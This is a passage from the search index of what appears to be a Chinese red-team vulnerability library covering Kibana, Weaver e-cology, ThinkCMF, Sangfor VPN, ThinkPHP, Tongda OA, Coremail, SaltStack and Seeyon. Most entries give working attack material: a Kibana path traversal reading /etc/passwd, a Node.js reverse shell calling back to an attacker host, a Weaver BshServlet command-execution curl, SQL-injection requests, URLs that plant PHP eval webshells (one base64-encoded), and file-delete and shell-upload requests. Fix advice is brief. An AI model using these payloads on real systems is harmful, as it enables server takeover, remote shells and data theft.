\uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c","title":"Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2018-17246","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246","title":"Kibana\u6f0f\u6d1eCVE-2018-17246"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa","text":"","title":"\u6cdb\u5faeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_1","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b https://www.weaver.com.cn/cs/securityDownload.asp","title":"\u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#e-cology-oasql","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md","title":"\u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#vpn","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770","title":"\u6df1\u4fe1\u670dVPN\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_2","text":"","title":"\u901a\u8fbeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_3","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c","title":"\u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_4","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php","title":"\u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_5","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4","title":"\u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#coremail","text":"\u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d","title":"Coremail\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#saltstack","text":"\u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3","title":"SaltStack\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_6","text":"\u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA 